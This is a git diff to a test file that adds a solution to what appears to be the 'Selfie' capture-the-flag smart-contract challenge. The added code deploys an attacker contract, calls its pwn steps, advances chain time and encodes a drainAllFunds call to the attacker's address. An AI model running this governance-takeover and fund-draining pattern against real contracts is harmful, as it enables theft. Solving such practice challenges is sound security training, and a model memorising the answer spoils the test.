@@ -31,6 +31,16 @@ describe('[Challenge] Selfie', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        var data = new ethers.utils.Interface([
+            'function drainAllFunds(address receiver)'
+        ]).encodeFunctionData('drainAllFunds', [
+            attacker.address
+        ]);
+        var AaronVoterFactory = await ethers.getContractFactory('AaronVoter', attacker);
+        this.aaron = await AaronVoterFactory.deploy(this.token.address, this.governance.address, this.pool.address, TOKENS_IN_POOL);
+        await this.aaron.pwn();
+        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); 
+        await this.aaron.pwn2();
     });
 
     after(async function () {
